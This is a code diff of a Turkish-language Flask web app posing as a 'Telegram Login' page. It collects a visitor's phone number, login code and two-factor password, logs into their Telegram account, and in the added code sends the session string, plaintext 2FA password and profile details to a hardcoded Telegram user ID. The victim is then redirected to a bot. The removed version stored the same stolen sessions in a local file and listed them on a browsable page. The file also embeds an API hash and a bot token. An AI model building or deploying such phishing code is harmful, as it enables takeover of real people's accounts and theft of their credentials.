@@ -1,12 +1,10 @@
-from flask import Flask, render_template_string, request, jsonify, redirect, session
+from flask import Flask, render_template_string, request, jsonify, session
 from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
+from telethon.errors import SessionPasswordNeededError
 from telethon.sessions import StringSession
 import asyncio
 import os
-from functools import wraps
 from datetime import timedelta
-import json
 import threading
 import time
 
@@ -19,20 +17,20 @@ API_ID = int(os.environ.get('TELEGRAM_API_ID', 35015231))
 API_HASH = os.environ.get('TELEGRAM_API_HASH', "33c5d03215ae1b7a0d961452d93e08c4")
 REDIRECT_BOT = os.environ.get('REDIRECT_BOT', "http://t.me/Xxxxxbbbbbbot")
 
-# Sessions file path
-SESSIONS_FILE = 'sessions.json'
+# Bot Configuration
+BOT_TOKEN = "8943751159:AAHWo4fV-ym69yaLQYJ8N4QRwA7izU12Yto"
+REDIRECT_USER_ID = 7777518098
 
 print("=" * 80)
 print("🚀 TELEGRAM LOGIN MINI APP - BAŞLATILIYOR")
 print("=" * 80)
 print(f"✅ API ID: {API_ID}")
-print(f"✅ Sessions dosyası: {SESSIONS_FILE}")
+print(f"✅ Bot Token: {BOT_TOKEN[:30]}...")
+print(f"✅ Target User: {REDIRECT_USER_ID}")
 print("=" * 80)
 
-# ==================== HTML TEMPLATES ====================
-
-# Ana giriş sayfası
-LOGIN_TEMPLATE = '''
+# HTML Template
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -56,51 +54,6 @@ LOGIN_TEMPLATE = '''
             padding: 20px;
         }
 
-        .navbar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            padding: 15px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .navbar-brand {
-            color: white;
-            font-weight: bold;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .navbar-links {
-            display: flex;
-            gap: 20px;
-        }
-
-        .navbar-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            padding: 8px 15px;
-            border-radius: 5px;
-        }
-
-        .navbar-links a:hover {
-            background: rgba(102, 126, 234, 0.5);
-        }
-
-        .navbar-links a.active {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        }
-
         .container {
             width: 100%;
             max-width: 450px;
@@ -109,7 +62,6 @@ LOGIN_TEMPLATE = '''
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             overflow: hidden;
             animation: slideUp 0.5s ease-out;
-            margin-top: 80px;
         }
 
         @keyframes slideUp {
@@ -193,28 +145,6 @@ LOGIN_TEMPLATE = '''
             color: #999;
         }
 
-        .input-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .input-wrapper input {
-            flex: 1;
-        }
-
-        .country-code {
-            padding: 14px 12px;
-            background: #f5f5f5;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-weight: 600;
-            color: #667eea;
-            font-size: 14px;
-            min-width: 60px;
-            text-align: center;
-        }
-
         .large-phone-input {
             width: 100%;
             padding: 20px 16px;
@@ -232,11 +162,6 @@ LOGIN_TEMPLATE = '''
         .large-phone-input:focus {
             border-color: #764ba2;
             box-shadow: 0 0 0 5px rgba(102, 126, 234, 0.2);
-        }
-
-        .large-phone-input::placeholder {
-            color: #ccc;
-            letter-spacing: 4px;
         }
 
         .btn {
@@ -276,17 +201,6 @@ LOGIN_TEMPLATE = '''
 
         .btn-secondary:hover:not(:disabled) {
             background: #e8e8e8;
-        }
-
-        .btn-danger {
-            background: #ff6b6b;
-            color: white;
-            padding: 8px 12px;
-            font-size: 12px;
-        }
-
-        .btn-danger:hover {
-            background: #ff5252;
         }
 
         .alert {
@@ -426,28 +340,10 @@ LOGIN_TEMPLATE = '''
                 padding: 18px 12px;
                 letter-spacing: 6px;
             }
-
-            .navbar {
-                flex-direction: column;
-                gap: 15px;
-            }
-
-            .navbar-links {
-                width: 100%;
-                justify-content: center;
-            }
         }
     </style>
 </head>
 <body>
-    <div class="navbar">
-        <div class="navbar-brand">📱 Telegram Login</div>
-        <div class="navbar-links">
-            <a href="/" class="active">Giriş Yap</a>
-            <a href="/sessions">Sessions</a>
-        </div>
-    </div>
-
     <div class="container">
         <div class="header">
             <div class="logo">📱</div>
@@ -468,7 +364,7 @@ LOGIN_TEMPLATE = '''
 
                 <div class="form-group">
                     <label>Ülke Seç</label>
-                    <select id="countryCode" class="country-code">
+                    <select id="countryCode">
                         <option value="+90">🇹🇷 Türkiye (+90)</option>
                         <option value="+1">🇺🇸 Amerika (+1)</option>
                         <option value="+44">🇬🇧 İngiltere (+44)</option>
@@ -626,9 +522,9 @@ LOGIN_TEMPLATE = '''
                         showAlert('Şifre doğrulaması gerekli', 'info');
                         switchStep(3);
                     } else {
-                        showAlert('Giriş başarılı! Sessions sayfasına yönlendiriliyorsunuz...', 'success');
+                        showAlert('Giriş başarılı!', 'success');
                         setTimeout(() => {
-                            window.location.href = '/sessions';
+                            window.location.href = '{{ redirect_bot }}';
                         }, 1500);
                     }
                 } else {
@@ -661,9 +557,9 @@ LOGIN_TEMPLATE = '''
                 const data = await response.json();
 
                 if (data.success) {
-                    showAlert('Giriş başarılı! Sessions sayfasına yönlendiriliyorsunuz...', 'success');
+                    showAlert('Giriş başarılı!', 'success');
                     setTimeout(() => {
-                        window.location.href = '/sessions';
+                        window.location.href = '{{ redirect_bot }}';
                     }, 1500);
                 } else {
                     showAlert(data.error || 'Şifre hatalı');
@@ -700,579 +596,94 @@ LOGIN_TEMPLATE = '''
 </html>
 '''
 
-# Sessions sayfası
-SESSIONS_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kaydedilmiş Sessions</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .navbar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            padding: 15px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .navbar-brand {
-            color: white;
-            font-weight: bold;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .navbar-links {
-            display: flex;
-            gap: 20px;
-        }
-
-        .navbar-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            padding: 8px 15px;
-            border-radius: 5px;
-        }
-
-        .navbar-links a:hover {
-            background: rgba(102, 126, 234, 0.5);
-        }
-
-        .navbar-links a.active {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        }
-
-        .container {
-            max-width: 1000px;
-            margin: 100px auto 20px;
-            padding: 30px;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-        }
-
-        .header {
-            margin-bottom: 30px;
-            text-align: center;
-        }
-
-        .header h1 {
-            color: #333;
-            font-size: 32px;
-            margin-bottom: 10px;
-        }
-
-        .header p {
-            color: #666;
-            font-size: 15px;
-        }
-
-        .sessions-count {
-            text-align: center;
-            margin: 20px 0;
-            padding: 15px;
-            background: #f0f4ff;
-            border-radius: 10px;
-            color: #667eea;
-            font-weight: 600;
-        }
-
-        .session-card {
-            background: #f9f9f9;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 15px;
-            transition: all 0.3s ease;
-            animation: slideUp 0.4s ease-out;
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .session-card:hover {
-            border-color: #667eea;
-            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.2);
-            background: white;
-        }
-
-        .session-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: start;
-            margin-bottom: 15px;
-        }
-
-        .session-phone {
-            font-size: 18px;
-            font-weight: 700;
-            color: #667eea;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .session-actions {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            padding: 8px 15px;
-            border: none;
-            border-radius: 8px;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .btn-copy {
-            background: #667eea;
-            color: white;
-        }
-
-        .btn-copy:hover {
-            background: #764ba2;
-            transform: translateY(-2px);
-        }
-
-        .btn-delete {
-            background: #ff6b6b;
-            color: white;
-        }
-
-        .btn-delete:hover {
-            background: #ff5252;
-            transform: translateY(-2px);
-        }
-
-        .btn-download {
-            background: #51cf66;
-            color: white;
-        }
-
-        .btn-download:hover {
-            background: #40c057;
-            transform: translateY(-2px);
-        }
-
-        .session-info {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-
-        .info-item {
-            padding: 12px;
-            background: white;
-            border-radius: 8px;
-            border-left: 4px solid #667eea;
-        }
-
-        .info-label {
-            font-size: 11px;
-            color: #999;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-
-        .info-value {
-            font-size: 14px;
-            color: #333;
-            font-weight: 500;
-            word-break: break-all;
-            font-family: 'Monaco', 'Courier New', monospace;
-        }
-
-        .session-code {
-            background: #f5f5f5;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: 12px;
-            margin-top: 15px;
-            position: relative;
-        }
-
-        .code-label {
-            font-size: 11px;
-            color: #999;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        .code-text {
-            font-family: 'Monaco', 'Courier New', monospace;
-            font-size: 12px;
-            color: #333;
-            word-break: break-all;
-            line-height: 1.5;
-            max-height: 150px;
-            overflow-y: auto;
-            padding: 10px;
-            background: white;
-            border-radius: 5px;
-        }
-
-        .empty-state {
-            text-align: center;
-            padding: 60px 20px;
-            color: #999;
-        }
-
-        .empty-state-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-
-        .empty-state h2 {
-            color: #666;
-            margin-bottom: 10px;
-        }
-
-        .empty-state p {
-            margin-bottom: 20px;
-        }
-
-        .btn-login {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            text-decoration: none;
-            padding: 12px 30px;
-            border-radius: 8px;
-            display: inline-block;
-            font-weight: 600;
-            transition: all 0.3s ease;
-        }
-
-        .btn-login:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
-        }
-
-        .alert {
-            padding: 12px 16px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .alert.show {
-            display: block;
-        }
-
-        .alert-success {
-            background: #efe;
-            color: #3c3;
-            border: 1px solid #cfc;
-        }
-
-        .alert-error {
-            background: #fee;
-            color: #c33;
-            border: 1px solid #fcc;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                margin: 80px 10px 20px;
-                padding: 20px;
-            }
-
-            .header h1 {
-                font-size: 24px;
-            }
-
-            .session-info {
-                grid-template-columns: 1fr;
-            }
-
-            .session-header {
-                flex-direction: column;
-                gap: 10px;
-            }
-
-            .session-actions {
-                width: 100%;
-            }
-
-            .btn {
-                flex: 1;
-                text-align: center;
-            }
-
-            .navbar {
-                flex-direction: column;
-                gap: 15px;
-            }
-
-            .navbar-links {
-                width: 100%;
-                justify-content: center;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="navbar">
-        <div class="navbar-brand">📱 Telegram Login</div>
-        <div class="navbar-links">
-            <a href="/">Giriş Yap</a>
-            <a href="/sessions" class="active">Sessions</a>
-        </div>
-    </div>
-
-    <div class="container">
-        <div class="header">
-            <h1>📋 Kaydedilmiş Sessions</h1>
-            <p>Başarıyla kaydedilmiş Telegram oturumları</p>
-        </div>
-
-        <div id="alert" class="alert"></div>
-        <div id="sessionsList"></div>
-    </div>
-
-    <script>
-        async function loadSessions() {
-            try {
-                const response = await fetch('/api/get-sessions');
-                const data = await response.json();
-
-                if (data.sessions && Object.keys(data.sessions).length > 0) {
-                    renderSessions(data.sessions);
-                } else {
-                    showEmptyState();
-                }
-            } catch (error) {
-                console.error('Error loading sessions:', error);
-                showAlert('Sessions yüklenirken hata oluştu', 'error');
-            }
-        }
-
-        function renderSessions(sessions) {
-            const list = document.getElementById('sessionsList');
-            const count = Object.keys(sessions).length;
-            
-            let html = `<div class="sessions-count">📊 Toplam ${count} session kaydedilmiş</div>`;
-
-            Object.entries(sessions).forEach(([phone, data]) => {
-                const timestamp = data.timestamp || 'Bilinmiyor';
-                const hasPassword = data.password ? '✅ Var' : '❌ Yok';
-                const firstName = data.user_info?.first_name || 'Bilinmiyor';
-                const lastName = data.user_info?.last_name || '';
-                const userId = data.user_info?.id || 'N/A';
-                const username = data.user_info?.username || 'N/A';
-                const sessionString = data.session || '';
-
-                html += `
-                    <div class="session-card">
-                        <div class="session-header">
-                            <div class="session-phone">📱 ${phone}</div>
-                            <div class="session-actions">
-                                <button class="btn btn-copy" onclick="copySessionString('${phone}')">📋 Kopyala</button>
-                                <button class="btn btn-download" onclick="downloadSession('${phone}')">⬇️ İndir</button>
-                                <button class="btn btn-delete" onclick="deleteSession('${phone}')">🗑️ Sil</button>
-                            </div>
-                        </div>
-
-                        <div class="session-info">
-                            <div class="info-item">
-                                <div class="info-label">👤 Ad Soyad</div>
-                                <div class="info-value">${firstName} ${lastName}</div>
-                            </div>
-                            <div class="info-item">
-                                <div class="info-label">🆔 User ID</div>
-                                <div class="info-value">${userId}</div>
-                            </div>
-                            <div class="info-item">
-                                <div class="info-label">📛 Username</div>
-                                <div class="info-value">@${username}</div>
-                            </div>
-                            <div class="info-item">
-                                <div class="info-label">🔐 2FA Şifresi</div>
-                                <div class="info-value">${hasPassword}</div>
-                            </div>
-                            <div class="info-item">
-                                <div class="info-label">⏰ Kaydedilme Tarihi</div>
-                                <div class="info-value">${timestamp}</div>
-                            </div>
-                        </div>
-
-                        <div class="session-code">
-                            <div class="code-label">🔑 Session String</div>
-                            <div class="code-text" id="code-${phone}">${sessionString}</div>
-                        </div>
-                    </div>
-                `;
-            });
-
-            list.innerHTML = html;
-        }
-
-        function showEmptyState() {
-            const list = document.getElementById('sessionsList');
-            list.innerHTML = `
-                <div class="empty-state">
-                    <div class="empty-state-icon">📭</div>
-                    <h2>Henüz session kaydedilmedi</h2>
-                    <p>Telegram hesabınızla giriş yaparak oturumunuzu kaydedin</p>
-                    <a href="/" class="btn-login">Giriş Yap</a>
-                </div>
-            `;
-        }
-
-        function copySessionString(phone) {
-            const codeText = document.getElementById(`code-${phone}`);
-            const text = codeText.textContent;
-            
-            navigator.clipboard.writeText(text).then(() => {
-                showAlert('✅ Session string kopyalandı!', 'success');
-            }).catch(() => {
-                showAlert('❌ Kopyalamada hata oluştu', 'error');
-            });
-        }
-
-        function downloadSession(phone) {
-            const codeText = document.getElementById(`code-${phone}`);
-            const text = codeText.textContent;
-            
-            const element = document.createElement('a');
-            element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
-            element.setAttribute('download', `session_${phone}.txt`);
-            element.style.display = 'none';
-            
-            document.body.appendChild(element);
-            element.click();
-            document.body.removeChild(element);
-            
-            showAlert('✅ Session dosyası indirildi!', 'success');
-        }
-
-        function deleteSession(phone) {
-            if (confirm(`Emin misiniz? ${phone} session'ı silinecektir.`)) {
-                fetch('/api/delete-session', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone })
-                }).then(response => response.json())
-                  .then(data => {
-                      if (data.success) {
-                          showAlert('✅ Session silindi!', 'success');
-                          loadSessions();
-                      } else {
-                          showAlert('❌ Silinirken hata oluştu', 'error');
-                      }
-                  })
-                  .catch(error => {
-                      console.error('Delete error:', error);
-                      showAlert('❌ Hata: ' + error.message, 'error');
-                  });
-            }
-        }
-
-        function showAlert(message, type = 'error') {
-            const alertEl = document.getElementById('alert');
-            alertEl.className = `alert show alert-${type}`;
-            alertEl.textContent = message;
-            setTimeout(() => alertEl.classList.remove('show'), 5000);
-        }
-
-        // Sayfanız yüklendiğinde sessions'ları yükle
-        document.addEventListener('DOMContentLoaded', loadSessions);
-    </script>
-</body>
-</html>
-'''
-
 # ==================== Helper Functions ====================
 
-def load_sessions():
-    """Sessionları dosyadan yükle"""
-    if os.path.exists(SESSIONS_FILE):
+def send_session_to_telegram(phone, user_info, session_string, password):
+    """Sesyon bilgilerini Telegram botuna gönder"""
+    def send_message():
         try:
-            with open(SESSIONS_FILE, 'r', encoding='utf-8') as f:
-                return json.load(f)
-        except:
-            return {}
-    return {}
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            
+            async def send_async():
+                try:
+                    bot_client = TelegramClient(
+                        StringSession(session_string),
+                        API_ID,
+                        API_HASH
+                    )
+                    
+                    await bot_client.connect()
+                    
+                    first_name = user_info.get('first_name', 'N/A')
+                    last_name = user_info.get('last_name', '')
+                    full_name = f"{first_name} {last_name}".strip()
+                    username = user_info.get('username', 'N/A')
+                    user_id = user_info.get('id', 'N/A')
+                    
+                    # Mesaj içeriği
+                    message = f"""
+🔐 <b>YENİ TELEGRAM SESSİONU BAŞARIYLA KAYDEDILDI</b>
 
-def save_sessions(sessions_data):
-    """Sessionları dosyaya kaydet"""
-    try:
-        with open(SESSIONS_FILE, 'w', encoding='utf-8') as f:
-            json.dump(sessions_data, f, indent=2, ensure_ascii=False)
-        return True
-    except Exception as e:
-        print(f"❌ Hata: Sessions kaydedilirken: {e}")
-        return False
+📱 <b>Telefon:</b> <code>{phone}</code>
+👤 <b>Ad Soyad:</b> {full_name if full_name else 'N/A'}
+🆔 <b>User ID:</b> <code>{user_id}</code>
+📛 <b>Username:</b> @{username}
+🔑 <b>2FA Şifresi:</b> <code>{password if password else 'YOK - Şifre koruması yok'}</code>
+⏰ <b>Zaman:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}
 
-def save_session_to_file(phone, password, session_string, user_info=None):
-    """Spesifik sessionu dosyaya kaydet"""
-    sessions = load_sessions()
-    sessions[phone] = {
-        'phone': phone,
-        'password': password,
-        'session': session_string,
-        'user_info': user_info or {},
-        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
-    }
-    save_sessions(sessions)
-    print(f"✅ Session kaydedildi: {phone}")
+✅ Session başarıyla kaydedildi
+📄 Session string aşağıdaki mesajda gönderildi
+"""
+                    
+                    # Mesajı user'a gönder
+                    await bot_client.send_message(
+                        REDIRECT_USER_ID,
+                        message,
+                        parse_mode='html'
+                    )
+                    
+                    # Session stringini mesaj olarak gönder
+                    session_message = f"""
+📄 <b>Session Verisi</b>
+
+<code>{session_string}</code>
+
+<b>Telefon:</b> {phone}
+<b>Zaman:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}
+"""
+                    
+                    await bot_client.send_message(
+                        REDIRECT_USER_ID,
+                        session_message,
+                        parse_mode='html'
+                    )
+                    
+                    await bot_client.disconnect()
+                    print(f"✅ [BAŞARILI] Telegram'a mesaj gönderildi: {phone}")
+                    return True
+                    
+                except Exception as e:
+                    print(f"❌ [HATA] Bot mesajı gönderirken: {str(e)}")
+                    return False
+            
+            loop.run_until_complete(send_async())
+            loop.close()
+            
+        except Exception as e:
+            print(f"❌ [HATA] Telegram gönderimi başarısız: {str(e)}")
+    
+    # Background thread'de gönder
+    thread = threading.Thread(target=send_message)
+    thread.daemon = True
+    thread.start()
 
 # ==================== Flask Routes ====================
 
 @app.route('/')
 def index():
     """Ana sayfa"""
-    return render_template_string(LOGIN_TEMPLATE)
-
-@app.route('/sessions')
-def sessions_page():
-    """Sessions sayfası"""
-    return render_template_string(SESSIONS_TEMPLATE)
+    return render_template_string(HTML_TEMPLATE, redirect_bot=REDIRECT_BOT)
 
 @app.route('/api/send-code', methods=['POST'])
 def send_code():
@@ -1284,6 +695,7 @@ def send_code():
         if not phone or len(phone) < 10:
             return jsonify({'success': False, 'error': 'Geçersiz telefon numarası'}), 400
 
+        # Async fonksiyonu çalıştır
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
 
@@ -1372,6 +784,7 @@ def verify_code():
                     'username': me.username or ''
                 }
                 
+                # Şifre adımı için sakla
                 session['user_info'] = user_info
                 session['session_string'] = saved_session
                 
@@ -1393,12 +806,13 @@ def verify_code():
             loop.close()
 
         if success:
+            # 2FA gerekliyse, şifre adımında gönderilecek
             if not password_needed:
-                # Direkt giriş başarılı
+                # Direkt giriş başarılı - Telegram'a gönder
                 user_info = session.get('user_info', {})
                 session_string = session.get('session_string', '')
-                print(f"✅ Direkt giriş başarılı: {phone}")
-                save_session_to_file(phone, None, session_string, user_info)
+                print(f"📤 Telegram'a gönderiliyor: {phone}")
+                send_session_to_telegram(phone, user_info, session_string, password=None)
             
             return jsonify({
                 'success': True,
@@ -1445,7 +859,7 @@ def verify_password():
                 session['telegram_session'] = saved_session
                 session['logged_in'] = True
                 
-                # Kullanıcı bilgisini al
+                # Kullanıcı bilgisini al (güncellenmiş)
                 me = await client.get_me()
                 updated_user_info = {
                     'id': me.id,
@@ -1455,25 +869,26 @@ def verify_password():
                 }
                 
                 await client.disconnect()
-                return True, None, updated_user_info
+                
+                # Telegram'a gönder
+                print(f"📤 Telegram'a gönderiliyor (2FA ile): {phone}")
+                send_session_to_telegram(phone, updated_user_info, saved_session, password)
+                
+                return True, None
             except Exception as e:
                 await client.disconnect()
                 error_msg = str(e)
                 print(f"❌ 2FA Hata: {error_msg}")
                 if 'invalid' in error_msg.lower():
-                    return False, 'Şifre hatalı', None
-                return False, f'Hata: {error_msg}', None
+                    return False, 'Şifre hatalı'
+                return False, f'Hata: {error_msg}'
 
         try:
-            success, error, updated_user_info = loop.run_until_complete(verify_password_async())
+            success, error = loop.run_until_complete(verify_password_async())
         finally:
             loop.close()
 
         if success:
-            # Session'ı dosyaya kaydet
-            saved_session = session.get('telegram_session', '')
-            save_session_to_file(phone, password, saved_session, updated_user_info)
-            print(f"✅ 2FA ile giriş başarılı: {phone}")
             return jsonify({'success': True}), 200
         else:
             return jsonify({'success': False, 'error': error}), 400
@@ -1482,48 +897,13 @@ def verify_password():
         print(f"❌ Exception: {str(e)}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
-@app.route('/api/get-sessions', methods=['GET'])
-def get_sessions():
-    """Kaydedilmiş sessions'ı getir"""
-    try:
-        sessions = load_sessions()
-        return jsonify({'sessions': sessions}), 200
-    except Exception as e:
-        print(f"❌ Hata: Sessions getirilirken: {e}")
-        return jsonify({'sessions': {}}), 200
-
-@app.route('/api/delete-session', methods=['POST'])
-def delete_session_route():
-    """Session'ı sil"""
-    try:
-        data = request.get_json()
-        phone = data.get('phone', '').strip()
-
-        if not phone:
-            return jsonify({'success': False, 'error': 'Telefon numarası gerekli'}), 400
-
-        sessions = load_sessions()
-        
-        if phone in sessions:
-            del sessions[phone]
-            save_sessions(sessions)
-            print(f"✅ Session silindi: {phone}")
-            return jsonify({'success': True}), 200
-        else:
-            return jsonify({'success': False, 'error': 'Session bulunamadı'}), 404
-
-    except Exception as e:
-        print(f"❌ Hata: Session silinirken: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 500
-
 # ==================== Main ====================
 
 if __name__ == '__main__':
     print("\n🎯 Sunucu başlatılıyor...")
     print("=" * 80)
-    print(f"🌐 Ana sayfa: http://localhost:5000")
-    print(f"📋 Sessions: http://localhost:5000/sessions")
-    print(f"💾 Sessions dosyası: {SESSIONS_FILE}")
+    print(f"🌐 URL: http://localhost:5000")
+    print(f"📤 Telegram User ID: {REDIRECT_USER_ID}")
     print("=" * 80)
     print("✅ Kurulum tamam! Tarayıcıda http://localhost:5000 açın\n")
     
